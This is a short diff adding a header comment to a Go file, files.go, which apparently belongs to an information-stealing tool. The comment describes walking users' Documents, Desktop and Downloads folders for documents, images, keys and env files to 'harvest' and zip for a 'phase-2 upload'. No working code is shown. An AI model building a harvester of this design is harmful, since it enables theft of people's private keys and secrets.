@@ -1,3 +1,9 @@
+// files.go — recursive user-directory file discovery for phase-2 upload.
+//
+// Walks common user folders (Documents, Desktop, Downloads, …) for interesting
+// extensions (docs, images, keys, env). Caps depth and total file count so a
+// huge home directory does not hang harvest. Content is not always read here;
+// listing metadata is enough for zip packaging later.
 package scanner
 
 import (
